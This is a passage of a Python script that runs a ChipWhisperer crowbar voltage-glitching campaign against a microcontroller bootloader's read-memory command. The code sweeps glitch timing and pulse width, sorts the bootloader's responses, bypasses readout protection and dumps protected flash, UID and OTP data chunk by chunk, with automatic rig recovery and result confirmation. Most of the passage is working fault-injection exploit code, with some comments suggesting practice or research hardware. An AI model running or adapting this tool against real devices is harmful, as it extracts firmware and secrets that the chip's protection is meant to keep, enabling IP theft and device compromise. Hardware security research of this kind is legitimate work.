    for _round in range(3):
        st = baseline_probe()
        if st == 'ok':
            return attempt(ext_offset, width, repeat)
        if st == 'unlocked':
            print('  [baseline] *** UNGLITCHED ACK - RDP bypass persisted!'
                  ' Completing read with no glitch. ***', flush=True)
            payload, note = complete_read()
            if payload and not validate_payload(payload, CUR[0][2]):
                return 'zombie', None, note or 'zombie payload'
            return ('SUCCESS' if payload else 'ACK_NO_DATA'), payload, \
                note or ''
        print(f'  [baseline] not at known baseline ({st}) -> recovering',
              flush=True)
        if _round == 0:
            ok = boot_and_sync(fast=True)      # cheap NRST resync first
        else:
            ok = boot_and_sync(fast=False)     # hard power-cycle baseline
        if not ok and not reconnect():
            raise IOError('baseline recovery failed')
    raise IOError('baseline probe failed 3x - refusing to guess')


def attempt(ext_offset, width, repeat):
    """One shot. Returns (verdict, payload, note)."""
    global LAST_W, LAST_O
    g = scope.glitch
    # width/offset writes trigger FPGA partial-reconfig + DCM reset - a known
    # hang risk (NewAE forum) and slow. Only write when the value changes.
    if width != LAST_W:
        g.width = width
        LAST_W = width
    if OFFSET != LAST_O:
        g.offset = OFFSET
        LAST_O = OFFSET
    g.ext_offset = ext_offset
    g.repeat = repeat
    scope.arm()
    ser.reset_input_buffer()
    ser.write(b'\x11\xee')            # the burst TIO3 triggers on
    r = ser.read(32)                  # NACK / ACK / silence
    if CROWBAR:
        try:
            scope.io.vglitch_reset()  # errata: FETs can stick ON (latch kept)
        except Exception:
            pass
    if r and 0x79 in r:
        # pre-buffer disambiguates REAL accept (79 79) from a glitch-
        # corrupted NACK#2 (1f 79) - see FINDINGS 2026-10-29 byte-by-byte
        pre = f'pre={r.hex()}'
        data, note = complete_read()
        if not data:
            # command-ACK but address phase refused: raw (NO-glitch) retries
            # only - the ROM may still be waiting on the address phase / the
            # corrupted state may persist briefly. There is deliberately NO
            # second glitch: a clean stage-1 clears RDP for the whole read
            # (see FINDINGS 2026-10-29, jerinsunny single-pulse capture).
            extra = []
            for _i in range(ADDR_RETRIES):
                data, note2 = complete_read()
                if data:
                    note = f'retry{_i + 1}: {note2}'
                    break
                extra.append(note2)
            if not data:
                note = f'{pre} ' + ' | '.join(extra + [note])
            else:
                note = f'{pre} {note}'
        if data:
            if validate_payload(data, CUR[0][2]):
                return 'SUCCESS', data, note or ''
            return 'zombie', None, (f'{note} ' if note else '') + \
                f'zero/short payload={data[:8].hex()}..'
        return 'ACK_NO_DATA', None, note
    if r and r.count(0x1F) >= 4:
        # 1f-FLOOD: chip stuck in an async NACK loop (2026-10-28 15:17:
        # 1600 'nacks' of 31x1f; LA showed 1fs flowing BEFORE our burst).
        # Needs a resync - not a clean verdict, must gate + reset flatline.
        return 'spam', None, f'{len(r)}B x1f-flood'
    if r and 0x1F in r:
        return 'nack', None, r.hex()
    if not r:
        return 'dead', None, ''
    return 'weird', None, r.hex()


def reconnect(tries=5):
    """Rebuild the CW + serial session after a USB dropout (the CW drops
    every ~12 min on this rig). Re-applies the full glitch/trigger config,
    then boots + syncs the target. Returns True when the rig is back."""
    global scope, ser, LAST_W, LAST_O
    for attr, val in (('glitch_hp', False), ('glitch_lp', False)):
        try:
            setattr(scope.io, attr, val)
        except Exception:
            pass
    try:
        scope.dis()
    except Exception:
        pass
    try:
        ser.close()
    except Exception:
        pass
    for attempt in range(tries):
        time.sleep(2.0)
        try:
            scope = cw.scope()
            try:
                import zipfile as _zf
                _fw = scope.scopetype.getFWConfig()
                _z = _zf.ZipFile(_fw.loader._bsBuiltinData)
                with open('/tmp/opencode/cwlite_interface.bit', 'wb') as _bf:
                    _bf.write(_z.read('cwlite_interface.bit'))
                scope.scopetype.reload_fpga('/tmp/opencode/cwlite_interface.bit')
            except Exception:
                pass
            scope.clock.clkgen_freq = CLKGEN
            g = scope.glitch
            g.clk_src = 'clkgen'
            g.output = OUTPUT
            g.trigger_src = 'ext_single'
            scope.trigger.triggers = 'tio3'
            scope.adc.basic_mode = 'rising_edge'

            scope.io.tio3 = 'high_z'
            scope.io.tio1 = True
            scope.io.tio2 = 'high_z'
            scope.io.tio4 = 'high_z'
            if CROWBAR:
                scope.io.glitch_hp = True   # re-arm after fresh CW open
                if LP_ARM:
                    scope.io.glitch_lp = True
            LAST_W = LAST_O = None          # force width/offset re-apply
            ser = serial.Serial(find_ftdi(), 115200, bytesize=8,
                                parity='E', stopbits=1, timeout=0.4)
            if boot_and_sync(fast=False):
                print(f'  [reconnect OK on try {attempt + 1}]', flush=True)
                return True
        except Exception as e:
            print(f'  [reconnect try {attempt + 1} failed: '
                  f'{type(e).__name__}]', flush=True)
    return False


def main():
    global scope, ser
    scope = cw.scope()
    scope.io.target_pwr = 'high_z'
    # Every fresh CW power-up makes the SAM3U load its OLD stored bitstream,
    # which mismatches the 6.0.0 partial-reconfig data (width knob dies).
    # Reprogram the FPGA from the package's matched bitstream+PR pair.
    try:
        import zipfile as _zf
        _fw = scope.scopetype.getFWConfig()
        _z = _zf.ZipFile(_fw.loader._bsBuiltinData)
        with open('/tmp/opencode/cwlite_interface.bit', 'wb') as _bf:
            _bf.write(_z.read('cwlite_interface.bit'))
        scope.scopetype.reload_fpga('/tmp/opencode/cwlite_interface.bit')
        print('[+] FPGA reloaded from 6.0.0 matched pair')
    except Exception as e:
        print(f'[!] FPGA reload skipped: {type(e).__name__} {e}')
    scope.clock.clkgen_freq = CLKGEN
    g = scope.glitch
    g.clk_src = 'clkgen'
    g.output = OUTPUT
    g.trigger_src = 'ext_single'
    scope.trigger.triggers = 'tio3'
    scope.adc.basic_mode = 'rising_edge'
    if OUTPUT == 'enable_only' and os.environ.get('G_LATCH') == '1':
        scope.io.glitch_lp = True      # legacy latch, opt-in via G_LATCH=1
        scope.io.glitch_hp = True
    if CROWBAR:
        scope.io.glitch_hp = True      # ARM the crowbar MOSFET (SMA pull)
        if LP_ARM:
            scope.io.glitch_lp = True  # second FET too - max pull (forum 2668)
        print('[+] CROWBAR ARMED: glitch_hp=True'
              + ('+glitch_lp (MAX pull)' if LP_ARM else '')
              + ' (vglitch_reset release after every shot)')
    scope.io.tio3 = 'high_z'

    ser = serial.Serial(UART, 115200, bytesize=8, parity='E',
                        stopbits=1, timeout=0.4)

    if not boot_and_sync(fast=False):
        teardown(); sys.exit('no sync to start')
    print(f'[+] STRENGTH: {OUTPUT} @ {CLKGEN/1e6:g} MHz clkgen, FETs '
          f'hp{"+lp" if LP_ARM else ""}, pulses: '
          + ', '.join(f'rep{r}={r / CLKGEN * 1e9:.1f}ns' for r in REPEATS),
          flush=True)
    print(f'[+] synced. sweep ext {EXT_MIN}-{EXT_MAX} step {STEP} '
          f'widths {WIDTHS} offset {OFFSET} repeats {REPEATS}')
    threading.Thread(target=_watchdog, daemon=True).start()

    tag = os.environ.get('G_TAG', '')
    log_path = os.path.join(
        'campaigns',
        f'glitch2_{datetime.now():%Y%m%d_%H%M%S}'
        + (f'_{tag}' if tag else '') + '.csv')
    logf = open(log_path, 'w', newline='')
    logw = csv.writer(logf)
    logw.writerow(['config', CLKGEN, OFFSET, ','.join(map(str, WIDTHS)),
                   ','.join(map(str, REPEATS)), EXT_MIN, EXT_MAX, tag])
    logw.writerow(['shot', 'ext_offset', 'us', 'width', 'repeat', 'rep_ns',
                   'verdict', 'note'])

    global DUMP_DIR, ORACLE
    # path only - the folder is created lazily on the first find (ensure_dump_dir)
    DUMP_DIR = os.path.join('dumps', f'run_{datetime.now():%Y%m%d_%H%M%S}')
    _oracle_path = os.environ.get('G_ORACLE', 'storage.bin')  # point at the
    # CURRENT chip's storage image (e.g. chips/chip-c/storage.bin); the working
    # storage.bin can be stale for a different chip/build.
    if os.path.isfile(_oracle_path):
        ORACLE = open(_oracle_path, 'rb').read()
        print(f'[+] practice oracle: {_oracle_path} ({len(ORACLE)} B, '
              f'informational compare)', flush=True)
    resume = os.environ.get('G_RESUME', '')
    if resume and os.path.isdir(resume):
        for t in TARGETS:
            p = os.path.join(resume, t[0] + '.bin')
            if os.path.isfile(p):
                DONE[t[0]] = open(p, 'rb').read()
        t = next_farm_target()   # farm flash; uid/otp3 are latch-only
        if t:
            CUR[0] = t
        print(f'[+] resumed {len(DONE)} chunks from {resume}, farming: '
              f'{CUR[0][0]} (uid/otp3 grabbed on any latch)', flush=True)
    print(f'[+] collector: {len(TARGETS)} chunks (16 KB storage + uid + '
          f'otp3), first target {CUR[0][0]} @ 0x{CUR[0][1]:08X}, '
          f'outdir dumps/run_*', flush=True)

    shot = 0
    t0 = time.time()
    need_baseline = True      # verify once at campaign start
    PASSES = int(os.environ.get('G_PASSES', 1))  # X passes through the grid
    _grid_n = len(EXTS) if EXTS else len(range(EXT_MIN, EXT_MAX + 1, STEP))
    total_shots = _grid_n * SAMPLES * PASSES

    def _passes():
        for _p in range(1, PASSES + 1):
            if PASSES > 1:
                print(f'[=] pass {_p}/{PASSES} through the grid '
                      f'({EXT_MIN}-{EXT_MAX} ext)', flush=True)
                try:
                    boot_and_sync(fast=True)   # fresh baseline between passes
                except Exception:
                    pass
            for e in (EXTS if EXTS else range(EXT_MIN, EXT_MAX + 1, STEP)):
                yield e

    _rep_lo = max(1, -int(-RND_LO_NS * CLKGEN // 1e9))   # ceil: never below LO
    _rep_hi = max(_rep_lo, int(RND_HI_NS * CLKGEN / 1e9))  # floor: never above HI
    # 2026-10-29 user: 48nm kills too often - HI capped at 45 -> with the
    # 6ns quantum @166.67MHz the effective ceiling is rep7 = 42nm.

    for ext in _passes():
        for width in WIDTHS:
            for repeat in (REPEATS if not RND_REP else [REPEATS[0]]):
                for _sample in range(SAMPLES):
                    if RND_REP:
                        # strength re-roll: uniform random pulse width in
                        # [RND_LO_NS, RND_HI_NS] (default 20-45nm), the
                        # other axis of the 2D search alongside the ext grid
                        repeat = random.randint(_rep_lo, _rep_hi)
                    # rig-drop recovery: any USB/CW/serial exception during a
                    # shot -> rebuild the session, RESUME at the same point.
                    try:
                        _kick()
                        if need_baseline:
                            verdict, payload, note = baseline_then_shot(
                                ext, width, repeat)
                        else:
                            verdict, payload, note = attempt(ext, width,
                                                             repeat)
                        # unknown state after these -> gate the next shot
                        need_baseline = verdict in ('dead', 'weird',
                                                    'ACK_NO_DATA',
                                                    'zombie', 'spam')
                    except Exception as e:
                        print(f'  [rig-drop] {type(e).__name__} at '
                              f'ext={ext * 1e6 / CLKGEN:.1f}us rep={repeat} '
                              f'-> reconnect', flush=True)
                        if not reconnect():
                            teardown(); sys.exit(f'rig lost after rig-drop: {e}')
                        need_baseline = True   # rebuilt session -> re-verify
                        continue          # same grid point, next stochastic roll
                    shot += 1
                    logw.writerow([shot, ext, round(ext * 1e6 / CLKGEN, 1),
                                   width, repeat,
                                   round(repeat / CLKGEN * 1e9, 1),
                                   verdict, note])
                    # live per-shot verdict (every glitch, not just heartbeats)
                    _ns = (f'={repeat / CLKGEN * 1e9:.1f}ns'
                           if OUTPUT == 'enable_only' else '')
                    _pct = 100.0 * shot / total_shots if total_shots else 0.0
                    print(f'  [{datetime.now():%H:%M:%S}] #{shot} '
                          f'({_pct:.2f}%) '
                          f'ext={ext} ({ext * 1e6 / CLKGEN:.1f}us) '
                          f'w{width} r{repeat}{_ns} -> {verdict}'
                          + (f' ({note})' if note else ''), flush=True)
                    # SUCCESS check MUST be inside the sample loop: payload
                    # is overwritten by the next shot. (Bug 2026-10-28: 8
                    # SUCCESS dumps swallowed by the SAMPLES loop, lost.)
                    # COLLECTOR: each flip banks the chunk it read, probes
                    # for a session-latch, then farms the next chunk.
                    if verdict == 'SUCCESS':
                        target = CUR[0]
                        name, addr, _n = target
                        # two-judge confirmation: oracle gates in practice,
                        # cross-read gates on the real device. confirm_chunk
                        # creates the dump dir lazily + logs the A/B row.
                        banked, orv, crv, n_good = confirm_chunk(target, payload)
                        if banked is None:
                            # a judge refused: practice oracle MISMATCH (ghost
                            # erase-pattern where data is expected) or cross-
                            # read disagreement. Keep forensics, do NOT bank,
                            # re-farm the same chunk.
                            open(os.path.join(DUMP_DIR, name + '.bad.bin'),
                                 'wb').write(payload)
                            print(f'  [!] REJECTED {name}: oracle={orv} '
                                  f'crossread={crv} (n_read={n_good}) - saved '
                                  f'.bad.bin, NOT banked, retrying chunk',
                                  flush=True)
                            logf.flush()
                            _flat[0] = 0
                        else:
                            was_done = name in DONE   # re-flip while fishing
                            DONE[name] = banked
                            _repns = repeat / CLKGEN * 1e9
                            if not was_done:
                                save_chunk(name, banked,
                                           f'{datetime.now():%H:%M:%S} shot#{shot} '
                                           f'ext={ext} ({ext*1e6/CLKGEN:.1f}us) '
                                           f'w{width} rep{repeat} ({_repns:.1f}ns) '
                                           f'{name} first16={banked[:16].hex()} '
                                           f'[{orv}/{crv}]')
                                print(f'\n[***] CHUNK SECURED  {name} '
                                      f'({len(banked)} B @ 0x{addr:08X}) '
                                      f'ext={ext} ({ext * 1e6 / CLKGEN:.1f}us) '
                                      f'w{width} rep{repeat}={_repns:.1f}ns '
                                      f'[oracle={orv} crossread={crv}]\n'
                                      f'      first16: {banked[:16].hex()}',
                                      flush=True)
                                alert_success(f'chunk secured, {len(DONE)} of '
                                              f'{len(TARGETS)}')
                                if name == 'storage_0000' and \
                                        banked[:4] == CANARY_MAGIC:
                                    print('      canary match - practice '
                                          'storage (informational only)',
                                          flush=True)
                            # on ANY flip, probe for a latch: if it latches,
                            # chain_unglitched grabs uid/otp3 FIRST, then drains
                            # the rest. Only "done" when uid/otp3 are in too.
                            if chain_unglitched():
                                assemble_and_report()
                                logf.flush()
                                teardown()
                                return
                            t = next_farm_target()   # keep farming flash
                            if t:
                                CUR[0] = t
                            if not was_done:
                                print(f'      collector -> next chunk '
                                      f'{CUR[0][0]} ({len(DONE)}/{len(TARGETS)} '
                                      f'banked, farming continues)', flush=True)
                            logf.flush()
                    # flatline detector: a firing crowbar disturbs ~5% of
                    # shots at these strengths. Hundreds of clean nacks in
                    # a row = pulses not landing (ghost session
                    # 2026-10-28 00:02: 10740 clean nacks, 0 disturbance
                    # after kill-9 + USB reset; healed on next fresh open).
                    if verdict == 'nack':
                        _flat[0] += 1
                        if _flat[0] == 400:
                            print('  [!!] 400 clean nacks in a row - crowbar'
                                  ' may be silent', flush=True)
                        if _flat[0] == 800:
                            print('  [!!] 800 clean nacks - re-arming FETs',
                                  flush=True)
                            try:
                                scope.io.glitch_hp = False
                                scope.io.glitch_hp = True
                                scope.io.glitch_lp = False
                                scope.io.glitch_lp = True
                            except Exception:
                                pass
                        if _flat[0] >= 1600:
                            print('  [!!] 1600 clean nacks - hard exit for'
                                  ' fresh relaunch', flush=True)
                            logf.flush()
                            teardown()
                            os._exit(4)
                    else:
                        _flat[0] = 0
                    if verdict in ('dead', 'ACK_NO_DATA', 'weird', 'zombie', 'spam'):
                        print(f'  [{verdict}] ext={ext * 1e6 / CLKGEN:6.1f}us '
                              f'rep={repeat} {note} -> resync', flush=True)
                        try:
                            ok = boot_and_sync(fast=True) or boot_and_sync(fast=False)
                        except Exception:
                            ok = False
                        if not ok:
                            if not reconnect():
                                teardown(); sys.exit('target/rig lost after resync')
                    # 1-shot-per-boot (Kesenheimer methodology, 2026-10-29):
                    # reset + fresh sync every N shots REGARDLESS of verdict -
                    # flips may be reset-conditioned (boot-to-boot HSI
                    # alignment). Their rig does exactly this every shot.
                    # (INSIDE the sample loop - bug 2026-10-29: was one level
                    # out, fired once per grid point instead of per shot)
                    elif RESET_EVERY and shot % RESET_EVERY == 0:
                        try:
                            ok = boot_and_sync(fast=True) or boot_and_sync(fast=False)
                        except Exception:
                            ok = False
                        print('  [rst ok]' if ok else '  [rst FAIL -> reconnect]',
                              flush=True)
                        if not ok:
                            if not reconnect():
                                teardown()
                                sys.exit('target/rig lost in reset-per-shot')
                time.sleep(COOLDOWN)
                if shot % REST_EVERY == 0:
                    print(f'  [{datetime.now():%m-%d %H:%M:%S}] '
                          f'…rest {REST_S}s ({shot} shots)')
                    time.sleep(REST_S)
                # heartbeat: rate + last verdict, so stalls show in the log
                if shot % 50 == 0:
                    rate = shot / (time.time() - t0)
                    t_us = ext * 1e6 / CLKGEN          # us after TIO3 edge
                    _pct = 100.0 * shot / total_shots if total_shots else 0.0
                    print(f'  [{datetime.now():%m-%d %H:%M:%S}] '
                          f'{shot} shots ({_pct:.2f}% of run), {rate:.1f}/s | chunks '
                          f'{len(DONE)}/{len(TARGETS)} | '
                          f'glitch time = {t_us + 8.7:.1f}us after 0x11 '
                          f'(ext {ext}, TIO3+{t_us:.1f}us) '
                          f'w{width} r{repeat} last={verdict}', flush=True)
                    logf.flush()
                if shot >= SHOTS_MAX:
                    print(f'  shot limit {SHOTS_MAX} reached')
                    logf.flush()
                    assemble_and_report()
                    teardown()
                    return
    logf.flush()
    assemble_and_report()
    print(f'[.] sweep done, {shot} shots, log -> {log_path}')
    teardown()


if __name__ == '__main__':
    main()
